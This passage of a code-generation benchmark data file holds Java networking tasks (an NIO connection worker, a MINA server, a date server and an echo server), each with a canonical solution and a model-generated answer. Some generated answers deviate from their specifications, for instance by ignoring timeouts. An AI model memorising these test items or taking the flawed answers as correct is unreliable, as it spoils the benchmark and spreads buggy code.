.uri(hubConfig.getDeviceDataUri(deviceId))\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .GET()\n                .build();\n        return httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenCompose(this::handleDeviceDataResponse);\n    }\n\n    private CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n        // Process device data response and return CompletableFuture<ReceivedKey>\n    }\n\n    public CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(hubConfig.getVaultMasterkeyUri(vaultId))\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .POST(HttpRequest.BodyPublishers.ofString(encryptedUserKey))\n                .build();\n        return httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenApply(response -> handleVaultMasterkeyResponse(encryptedUserKey, response));\n    }\n\n    private ReceivedKey handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n        // Process vault master key response and return ReceivedKey\n    }\n\n    public CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(hubConfig.getLegacyAccessTokenUri())\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .POST(HttpRequest.BodyPublishers.noBody())\n                .build();\n        return httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenApply(this::handleLegacyAccessTokenResponse);\n    }\n\n    private ReceivedKey handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n        // Process legacy access token response and return ReceivedKey\n    }\n\n    private ReceivedKey retrievalFailed(Throwable cause) {\n        // Handle request failure and return ReceivedKey\n    }\n}\n```"
  },
  {
    "Task_id": 435,
    "Instruction": "Task Description: Implement a Java class that manages TCP client connections using Java NIO (Non-blocking I/O) techniques, including connection establishment, data writing, and cleanup operations.\n\nClass Description: ConnectionWorker is a Runnable class that handles asynchronous TCP client connections using Java NIO. It manages connection tasks through a selector pattern, processes write operations, and performs periodic cleanup of stale connections. The class supports concurrent operations through queue-based task management.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging operations\n- stop: boolean - Volatile flag to control thread execution\n- selector: Selector - NIO selector for managing channels\n- myConnectQueue: BlockingQueue<ConnectTask> - Queue for pending connection tasks\n- myWriteQueue: BlockingQueue<WriteTask> - Queue for pending write operations\n- mySemaphore: Semaphore - Controls access to the worker thread\n- myKeyProcessors: List<KeyProcessor> - Processors for handling different channel operations\n- myTimeService: TimeService - Provides time-related functionality\n- lastCleanupTime: long - Timestamp of last cleanup operation\n- mySelectorTimeoutMillis: int - Timeout for selector operations\n- myCleanupTimeoutMillis: long - Timeout between cleanup operations\n- myCleanupProcessor: CleanupProcessor - Handles connection cleanup\n- myNewConnectionAllower: NewConnectionAllower - Controls new connection allowance\n\nMethods:\n- run(): void - Main execution method implementing Runnable interface\n- connectToPeersFromQueue(): void - Processes pending connection tasks from queue\n- processSelectedKeys(): void - Processes all ready selection keys\n- processSelectedKey(SelectionKey): void - Processes a single selection key\n- offerConnect(ConnectTask, int, TimeUnit): boolean - Adds new connection task to queue\n- addTaskToQueue(T, int, TimeUnit, BlockingQueue<T>): boolean - Generic method for adding tasks to queues\n- processWriteTasks(): void - Processes pending write operations (implied from code context)\n- cleanup(): void - Performs cleanup operations (implied from code context)\n- needRunCleanup(): boolean - Determines if cleanup is needed (implied from code context)",
    "Canonical_solution": "import com.turn.ttorrent.common.LoggerUtils;\nimport com.turn.ttorrent.common.TimeService;\nimport com.turn.ttorrent.common.TorrentLoggerFactory;\nimport com.turn.ttorrent.network.keyProcessors.CleanupProcessor;\nimport com.turn.ttorrent.network.keyProcessors.KeyProcessor;\nimport org.slf4j.Logger;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.concurrent.Semaphore;\nimport java.util.concurrent.TimeUnit;\n\npublic class ConnectionWorker implements Runnable {\n\n  private static final Logger logger = TorrentLoggerFactory.getLogger(ConnectionWorker.class);\n  private static final String SELECTOR_THREAD_NAME = \"Torrent channels manager thread\";\n  private volatile boolean stop = false;\n  private final Selector selector;\n  private final BlockingQueue<ConnectTask> myConnectQueue;\n  private final BlockingQueue<WriteTask> myWriteQueue;\n  private final Semaphore mySemaphore;\n  private final List<KeyProcessor> myKeyProcessors;\n  private final TimeService myTimeService;\n  private long lastCleanupTime;\n  private volatile int mySelectorTimeoutMillis;\n  private volatile long myCleanupTimeoutMillis;\n  private final CleanupProcessor myCleanupProcessor;\n  private final NewConnectionAllower myNewConnectionAllower;\n\n  public ConnectionWorker(Selector selector,\n                   List<KeyProcessor> keyProcessors,\n                   int selectorTimeoutMillis,\n                   int cleanupTimeoutMillis,\n                   TimeService timeService,\n                   CleanupProcessor cleanupProcessor,\n                   NewConnectionAllower myNewConnectionAllower) {\n    this.selector = selector;\n    this.myTimeService = timeService;\n    this.lastCleanupTime = timeService.now();\n    this.mySelectorTimeoutMillis = selectorTimeoutMillis;\n    this.myCleanupTimeoutMillis = cleanupTimeoutMillis;\n    this.myCleanupProcessor = cleanupProcessor;\n    this.myNewConnectionAllower = myNewConnectionAllower;\n    this.mySemaphore = new Semaphore(1);\n    this.myConnectQueue = new LinkedBlockingQueue<ConnectTask>(100);\n    this.myKeyProcessors = keyProcessors;\n    this.myWriteQueue = new LinkedBlockingQueue<WriteTask>(5000);\n  }\n\n  @Override\n  public void run() {\n    try {\n      mySemaphore.acquire();\n    } catch (InterruptedException e) {\n      return;\n    }\n\n    final String oldName = Thread.currentThread().getName();\n\n    try {\n      Thread.currentThread().setName(SELECTOR_THREAD_NAME);\n\n      while (!stop && (!Thread.currentThread().isInterrupted())) {\n        try {\n          logger.trace(\"try select keys from selector\");\n          int selected;\n          try {\n            selected = selector.select(mySelectorTimeoutMillis);\n          } catch (ClosedSelectorException e) {\n            break;\n          }\n          connectToPeersFromQueue();\n          processWriteTasks();\n          logger.trace(\"select keys from selector. Keys count is \" + selected);\n          if (selected != 0) {\n            processSelectedKeys();\n          }\n          if (needRunCleanup()) {\n            cleanup();\n          }\n        } catch (Throwable e) {\n          LoggerUtils.warnAndDebugDetails(logger, \"unable to select channel keys. Error message {}\", e.getMessage(), e);\n        }\n      }\n    } catch (Throwable e) {\n      LoggerUtils.errorAndDebugDetails(logger, \"exception on cycle iteration\", e);\n    } finally {\n      Thread.currentThread().setName(oldName);\n      mySemaphore.release();\n    }\n  }\n\n  private void connectToPeersFromQueue() {\n    ConnectTask connectTask;\n    while ((connectTask = myConnectQueue.poll()) != null) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      logger.debug(\"try connect to peer. Connect task is {}\", connectTask);\n      try {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.register(selector, SelectionKey.OP_CONNECT, connectTask);\n        socketChannel.connect(new InetSocketAddress(connectTask.getHost(), connectTask.getPort()));\n      } catch (IOException e) {\n        LoggerUtils.warnAndDebugDetails(logger, \"unable connect. Connect task is {}\", connectTask, e);\n      }\n    }\n  }\n\n  private void processSelectedKeys() {\n    Set<SelectionKey> selectionKeys = selector.selectedKeys();\n    for (SelectionKey key : selectionKeys) {\n      if (stop || Thread.currentThread().isInterrupted()) {\n        return;\n      }\n      try {\n        processSelectedKey(key);\n      } catch (Exception e) {\n        logger.warn(\"error {} in processing key. Close channel {}\", e.getMessage(), key.channel());\n        logger.debug(\"\", e);\n        try {\n          key.channel().close();\n        } catch (IOException ioe) {\n          LoggerUtils.errorAndDebugDetails(logger, \"unable close bad channel\", ioe);\n        }\n      }\n    }\n    selectionKeys.clear();\n  }\n\n  private void processSelectedKey(SelectionKey key) throws IOException {\n    logger.trace(\"try process key for channel {}\", key.channel());\n    myCleanupProcessor.processSelected(key);\n    if (!key.channel().isOpen()) {\n      key.cancel();\n      return;\n    }\n    for (KeyProcessor keyProcessor : myKeyProcessors) {\n      if (keyProcessor.accept(key)) {\n        keyProcessor.process(key);\n      }\n    }\n  }\n\n  public boolean offerConnect(ConnectTask connectTask, int timeout, TimeUnit timeUnit) {\n    if (!myNewConnectionAllower.isNewConnectionAllowed()) {\n      logger.info(\"can not add connect task {} to queue. New connection is not allowed\", connectTask);\n      return false;\n    }\n    return addTaskToQueue(connectTask, timeout, timeUnit, myConnectQueue);\n  }\n\n  private <T> boolean addTaskToQueue(T task, int timeout, TimeUnit timeUnit, BlockingQueue<T> queue) {\n    try {\n      if (queue.offer(task, timeout, timeUnit)) {\n        logger.trace(\"added task {}. Wake up selector\", task);\n        selector.wakeup();\n        return true;\n      }\n    } catch (InterruptedException e) {\n      logger.debug(\"Task {} interrupted before was added to queue\", task);\n    }\n    logger.debug(\"Task {} was not added\", task);\n    return false;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.Semaphore;\nimport java.util.concurrent.TimeUnit;\n\npublic class ConnectionWorker implements Runnable {\n    private static final Logger logger = LoggerFactory.getLogger(ConnectionWorker.class);\n    private volatile boolean stop;\n    private Selector selector;\n    private BlockingQueue<ConnectTask> myConnectQueue;\n    private BlockingQueue<WriteTask> myWriteQueue;\n    private Semaphore mySemaphore;\n    private List<KeyProcessor> myKeyProcessors;\n    private TimeService myTimeService;\n    private long lastCleanupTime;\n    private int mySelectorTimeoutMillis;\n    private long myCleanupTimeoutMillis;\n    private CleanupProcessor myCleanupProcessor;\n    private NewConnectionAllower myNewConnectionAllower;\n\n    @Override\n    public void run() {\n        try {\n            while (!stop) {\n                selector.select(mySelectorTimeoutMillis);\n                processSelectedKeys();\n                processWriteTasks();\n                if (needRunCleanup()) {\n                    cleanup();\n                }\n            }\n        } catch (IOException e) {\n            logger.error(\"Error occurred in ConnectionWorker\", e);\n        } finally {\n            closeResources();\n        }\n    }\n\n    private void connectToPeersFromQueue() {\n        ConnectTask task;\n        while ((task = myConnectQueue.poll()) != null) {\n            SocketChannel channel = task.getChannel();\n            try {\n                channel.configureBlocking(false);\n                channel.connect(new InetSocketAddress(task.getPeerAddress(), task.getPort()));\n                channel.register(selector, SelectionKey.OP_CONNECT, task);\n            } catch (IOException e) {\n                logger.error(\"Failed to connect to peer: \" + task.getPeerAddress(), e);\n            }\n        }\n    }\n\n    private void processSelectedKeys() {\n        Iterator<SelectionKey> selectedKeysIterator = selector.selectedKeys().iterator();\n        while (selectedKeysIterator.hasNext()) {\n            SelectionKey key = selectedKeysIterator.next();\n            processSelectedKey(key);\n            selectedKeysIterator.remove();\n        }\n    }\n\n    private void processSelectedKey(SelectionKey key) {\n        KeyProcessor processor = findKeyProcessor(key);\n        if (processor != null) {\n            processor.process(key);\n        }\n    }\n\n    private boolean offerConnect(ConnectTask task, int timeout, TimeUnit unit) {\n        return addTaskToQueue(task, timeout, unit, myConnectQueue);\n    }\n\n    private <T> boolean addTaskToQueue(T task, int timeout, TimeUnit unit, BlockingQueue<T> queue) {\n        try {\n            queue.put(task);\n            return true;\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            logger.warn(\"Interrupted while adding task to queue\");\n            return false;\n        }\n    }\n\n    private void processWriteTasks() {\n        WriteTask task;\n        while ((task = myWriteQueue.poll()) != null) {\n            SocketChannel channel = task.getChannel();\n            ByteBuffer buffer = task.getBuffer();\n            try {\n                channel.write(buffer);\n                if (buffer.hasRemaining()) {\n                    channel.register(selector, SelectionKey.OP_WRITE, task);\n                } else {\n                    channel.register(selector, SelectionKey.OP_READ);\n                }\n            } catch (IOException e) {\n                logger.error(\"Failed to write data to channel\", e);\n            }\n        }\n    }\n\n    private void cleanup() {\n        // Implementation of cleanup logic\n    }\n\n    private boolean needRunCleanup() {\n        return System.currentTimeMillis() - lastCleanupTime > myCleanupTimeoutMillis;\n    }\n\n    private KeyProcessor findKeyProcessor(SelectionKey key) {\n        for (KeyProcessor processor : myKeyProcessors) {\n            if (processor.canHandle(key)) {\n                return processor;\n            }\n        }\n        return null;\n    }\n\n    private void closeResources() {\n        try {\n            selector.close();\n        } catch (IOException e) {\n            logger.error(\"Failed to close selector\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 436,
    "Instruction": "Task Description: Implement a TCP server using Apache MINA framework in Java that handles incoming connections, processes messages, and manages server lifecycle operations.\n\nClass Description: MinaRemotingServer is a concrete implementation of AbstractRemotingServer that uses Apache MINA for TCP communication. It handles server initialization, message processing, and shutdown procedures.\n\nAttributes:\n- acceptor: [IoAcceptor] - The MINA IO acceptor that manages socket connections\n- bindAddress: [InetSocketAddress] - The address and port the server binds to\n\nMethods:\n- serverStart() -> [void] - Initializes and starts the MINA TCP server by:\n  1. Creating a NioSocketAcceptor\n  2. Adding protocol codec and MDC injection filters\n  3. Setting the connection handler\n  4. Configuring session timeouts\n  5. Binding to the specified port\n  Throws RemotingException if startup fails\n\n- serverShutdown() -> [void] - Stops the server by:\n  1. Unbinding from the port\n  2. Disposing of the acceptor resources\n  Throws RemotingException if shutdown fails\n\n- MinaRemotingServer([RemotingServerConfig]) -> [void] - Constructor that initializes with server configuration\n- MinaRemotingServer([RemotingServerConfig], [ChannelEventListener]) -> [void] - Constructor that initializes with both server configuration and channel event listener",
    "Canonical_solution": "import com.github.ltsopensource.remoting.AbstractRemotingServer;\nimport com.github.ltsopensource.remoting.ChannelEventListener;\nimport com.github.ltsopensource.remoting.RemotingServerConfig;\nimport com.github.ltsopensource.remoting.exception.RemotingException;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.filter.logging.MdcInjectionFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\n\npublic class MinaRemotingServer extends AbstractRemotingServer {\n\n    private IoAcceptor acceptor;\n    private InetSocketAddress bindAddress;\n\n    public MinaRemotingServer(RemotingServerConfig remotingServerConfig) {\n        this(remotingServerConfig, null);\n    }\n\n    public MinaRemotingServer(RemotingServerConfig remotingServerConfig, ChannelEventListener channelEventListener) {\n        super(remotingServerConfig, channelEventListener);\n    }\n\n    @Override\n    protected void serverStart() throws RemotingException {\n        acceptor = new NioSocketAcceptor();\n        acceptor.getFilterChain().addLast(\"codec\", new ProtocolCodecFilter(new MinaCodecFactory(getCodec())));\n        acceptor.getFilterChain().addLast(\"mdc\", new MdcInjectionFilter());\n        acceptor.setHandler(new MinaHandler(this));\n        IoSessionConfig cfg = acceptor.getSessionConfig();\n        cfg.setReaderIdleTime(remotingServerConfig.getReaderIdleTimeSeconds());\n        cfg.setWriterIdleTime(remotingServerConfig.getWriterIdleTimeSeconds());\n        cfg.setBothIdleTime(remotingServerConfig.getServerChannelMaxIdleTimeSeconds());\n\n        bindAddress = new InetSocketAddress(remotingServerConfig.getListenPort());\n        try {\n            acceptor.bind(bindAddress);\n        } catch (IOException e) {\n            throw new RemotingException(\"Start Mina server error\", e);\n        }\n    }\n\n    @Override\n    protected void serverShutdown() throws RemotingException {\n        if (acceptor != null) {\n            acceptor.unbind(bindAddress);\n            acceptor.dispose();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 11,
    "right_result": "```java\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.session.IdleStatus;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.filter.logging.LoggingFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\n\npublic class MinaRemotingServer extends AbstractRemotingServer {\n\n    private IoAcceptor acceptor;\n    private InetSocketAddress bindAddress;\n\n    public MinaRemotingServer(RemotingServerConfig config) {\n        this(config, null);\n    }\n\n    public MinaRemotingServer(RemotingServerConfig config, ChannelEventListener listener) {\n        super(config, listener);\n        this.bindAddress = new InetSocketAddress(config.getPort());\n    }\n\n    @Override\n    public void serverStart() throws RemotingException {\n        try {\n            acceptor = new NioSocketAcceptor();\n            acceptor.getFilterChain().addLast(\"codec\", new ProtocolCodecFilter(new CustomProtocolCodecFactory()));\n            acceptor.getFilterChain().addLast(\"logger\", new LoggingFilter());\n            acceptor.setHandler(new MinaMessageHandler(this));\n            acceptor.getSessionConfig().setIdleTime(IdleStatus.BOTH_IDLE, 60);\n            acceptor.bind(bindAddress);\n        } catch (Exception e) {\n            throw new RemotingException(\"Failed to start Mina server\", e);\n        }\n    }\n\n    @Override\n    public void serverShutdown() throws RemotingException {\n        try {\n            if (acceptor != null) {\n                acceptor.unbind();\n                acceptor.dispose();\n            }\n        } catch (Exception e) {\n            throw new RemotingException(\"Failed to shut down Mina server\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 438,
    "Instruction": "Task Description: Implement a Java NIO-based TCP server that can handle multiple client connections simultaneously on specified ports, and respond with the current date and time when a client connects.\n\nClass Description: The DateServer class is a non-blocking TCP server implementation using Java NIO that listens on multiple ports and sends the current date to connecting clients.\n\nAttributes:\n- selector: Selector - Manages multiple channels and handles I/O operations\n- serverChannels: ServerSocketChannel[] - Array of server channels listening on different ports\n- ports: int[] - Array of port numbers the server should listen on\n\nMethods:\n- DateServer(int[] ports) -> void - Constructor that initializes the server with specified ports\n- initializeServer() -> void - Sets up server channels, configures them as non-blocking, and binds to ports\n- start() -> void - Main server loop that processes incoming connections using the selector\n- handleAccept(SelectionKey key) -> void - Handles new client connections and sends current date\n- close() -> void - Properly closes all server channels and selector to release resources",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Date;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class DateServer {\n\n    private Selector selector;\n    private ServerSocketChannel[] serverChannels;\n    private int[] ports;\n\n    public DateServer(int[] ports) throws Exception {\n        this.ports = ports;\n        this.selector = Selector.open();\n        this.serverChannels = new ServerSocketChannel[ports.length];\n        initializeServer();\n    }\n\n    private void initializeServer() throws Exception {\n        for (int i = 0; i < ports.length; i++) {\n            serverChannels[i] = ServerSocketChannel.open();\n            serverChannels[i].configureBlocking(false);\n            ServerSocket serverSocket = serverChannels[i].socket();\n            InetSocketAddress address = new InetSocketAddress(ports[i]);\n            serverSocket.bind(address);\n            serverChannels[i].register(selector, SelectionKey.OP_ACCEPT);\n            System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u5728\" + ports[i] + \"\u7aef\u53e3\u76d1\u542c\u3002\");\n        }\n    }\n\n    public void start() throws Exception {\n        int keysAdd = 0;\n        while ((keysAdd = selector.select()) > 0) {\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iter = selectedKeys.iterator();\n            while (iter.hasNext()) {\n                SelectionKey key = iter.next();\n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                }\n                iter.remove();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws Exception {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel client = server.accept();\n        client.configureBlocking(false);\n        ByteBuffer outBuf = ByteBuffer.allocateDirect(1024);\n        outBuf.put((\"\u5f53\u524d\u7684\u65f6\u95f4\u4e3a\uff1a\" + new Date()).getBytes());\n        outBuf.flip();\n        client.write(outBuf);\n        client.close();\n    }\n\n    public void close() throws Exception {\n        for (ServerSocketChannel channel : serverChannels) {\n            if (channel != null) {\n                channel.close();\n            }\n        }\n        if (selector != null) {\n            selector.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.time.LocalDateTime;\nimport java.time.format.DateTimeFormatter;\nimport java.util.Iterator;\n\npublic class DateServer {\n    private Selector selector;\n    private ServerSocketChannel[] serverChannels;\n    private int[] ports;\n\n    public DateServer(int[] ports) {\n        this.ports = ports;\n        try {\n            selector = Selector.open();\n            serverChannels = new ServerSocketChannel[ports.length];\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void initializeServer() {\n        for (int i = 0; i < ports.length; i++) {\n            try {\n                serverChannels[i] = ServerSocketChannel.open();\n                serverChannels[i].configureBlocking(false);\n                serverChannels[i].bind(new InetSocketAddress(ports[i]));\n                serverChannels[i].register(selector, SelectionKey.OP_ACCEPT);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void start() {\n        while (true) {\n            try {\n                selector.select();\n                Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n                while (keys.hasNext()) {\n                    SelectionKey key = keys.next();\n                    if (key.isAcceptable()) {\n                        handleAccept(key);\n                    }\n                    keys.remove();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) {\n        try {\n            SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n            clientChannel.configureBlocking(false);\n            ByteBuffer buffer = ByteBuffer.allocate(128);\n            DateTimeFormatter formatter = DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\");\n            String currentDate = LocalDateTime.now().format(formatter);\n            buffer.put(currentDate.getBytes());\n            buffer.flip();\n            clientChannel.write(buffer);\n            clientChannel.register(selector, SelectionKey.OP_READ);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            for (ServerSocketChannel channel : serverChannels) {\n                if (channel != null && channel.isOpen()) {\n                    channel.close();\n                }\n            }\n            selector.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        int[] ports = {8080, 9090};\n        DateServer server = new DateServer(ports);\n        server.initializeServer();\n        server.start();\n    }\n}\n```"
  },
  {
    "Task_id": 439,
    "Instruction": "Task Description: Implement a non-blocking TCP echo server using Java NIO (New I/O) that can handle multiple client connections simultaneously. The server should echo back any data received from clients.\n\nClass Description: NonBlokingEchoServer is a Java NIO-based server implementation that uses non-blocking I/O operations to handle multiple client connections efficiently through a single thread. It utilizes Selector, ServerSocketChannel, and SocketChannel for managing connections and ByteBuffer for data operations.\n\nAttributes:\n- serverChannel: [ServerSocketChannel] - The main server channel that listens for incoming connections\n- selector: [Selector] - The multiplexor that monitors registered channels for I/O events\n- port: [int] - The port number on which the server listens for connections\n\nMethods:\n- NonBlokingEchoServer(int port) -> [void] - Constructor that initializes the server with the specified port\n- start() -> [void] - Starts the server, binds to the port, and begins accepting client connections\n- handleKey(SelectionKey key) -> [void] - Handles different types of I/O events (accept, read, write)\n- handleAccept(SelectionKey key) -> [void] - Processes new client connection requests\n- handleRead(SelectionKey key) -> [void] - Reads data from connected clients\n- handleWrite(SelectionKey key) -> [void] - Writes data back to connected clients\n- close() -> [void] - Closes the server channel and selector, releasing all resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NonBlokingEchoServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private int port;\n\n    public NonBlokingEchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverChannel = ServerSocketChannel.open();\n        InetSocketAddress address = new InetSocketAddress(port);\n        serverChannel.bind(address);\n        serverChannel.configureBlocking(false);\n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        System.out.println(\"NonBlokingEchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n\n        while (true) {\n            try {\n                selector.select();\n            } catch (IOException e) {\n                System.out.println(\"NonBlockingEchoServer\u5f02\u5e38!\" + e.getMessage());\n            }\n            Set<SelectionKey> readyKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iterator = readyKeys.iterator();\n            while (iterator.hasNext()) {\n                SelectionKey key = iterator.next();\n                iterator.remove();\n                try {\n                    handleKey(key);\n                } catch (IOException ex) {\n                    key.cancel();\n                    try {\n                        key.channel().close();\n                    } catch (IOException cex) {\n                        System.out.println(\"NonBlockingEchoServer\u5f02\u5e38!\" + cex.getMessage());\n                    }\n                }\n            }\n        }\n    }\n\n    private void handleKey(SelectionKey key) throws IOException {\n        if (key.isAcceptable()) {\n            handleAccept(key);\n        } else if (key.isReadable()) {\n            handleRead(key);\n        } else if (key.isWritable()) {\n            handleWrite(key);\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel server = (ServerSocketChannel) key.channel();\n        SocketChannel socketChannel = server.accept();\n        System.out.println(\"NonBlokingEchoServer\u63a5\u53d7\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\uff1a\" + socketChannel);\n        socketChannel.configureBlocking(false);\n        SelectionKey clientKey = socketChannel.register(selector,\n                SelectionKey.OP_WRITE | SelectionKey.OP_READ);\n        ByteBuffer buffer = ByteBuffer.allocate(100);\n        clientKey.attach(buffer);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer output = (ByteBuffer) key.attachment();\n        client.read(output);\n        System.out.println(client.getRemoteAddress() \n                + \" -> NonBlokingEchoServer\uff1a\" + output.toString());\n        key.interestOps(SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel client = (SocketChannel) key.channel();\n        ByteBuffer output = (ByteBuffer) key.attachment();\n        output.flip();\n        client.write(output);\n        System.out.println(\"NonBlokingEchoServer  -> \" \n                + client.getRemoteAddress() + \"\uff1a\" + output.toString());\n        output.compact();\n        key.interestOps(SelectionKey.OP_READ);\n    }\n\n    public void close() throws IOException {\n        if (serverChannel != null) {\n            serverChannel.close();\n        }\n        if (selector != null) {\n            selector.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\n\npublic class NonBlockingEchoServer {\n    private ServerSocketChannel serverChannel;\n    private Selector selector;\n    private int port;\n\n    public NonBlockingEchoServer(int port) throws IOException {\n        this.port = port;\n        serverChannel = ServerSocketChannel.open();\n        serverChannel.configureBlocking(false);\n        serverChannel.socket().bind(new InetSocketAddress(port));\n        selector = Selector.open();\n        serverChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    public void start() throws IOException {\n        while (true) {\n            selector.select();\n            Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n            while (keys.hasNext()) {\n                SelectionKey key = keys.next();\n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                } else if (key.isReadable()) {\n                    handleRead(key);\n                } else if (key.isWritable()) {\n                    handleWrite(key);\n                }\n                keys.remove();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = clientChannel.read(buffer);\n        if (bytesRead == -1) {\n            clientChannel.close();\n        } else if (bytesRead > 0) {\n            buffer.flip();\n            clientChannel.register(selector, SelectionKey.OP_WRITE, buffer);\n        }\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = (ByteBuffer) key.attachment();\n        clientChannel.write(buffer);\n        if (!buffer.hasRemaining()) {\n            clientChannel.register(selector, SelectionKey.OP_READ);\n        }\n    }\n\n    public void close() throws IOException {\n        serverChannel.close();\n        selector.close();\n    }\n}\n```"
  },
  {
    "Task_id": 44,
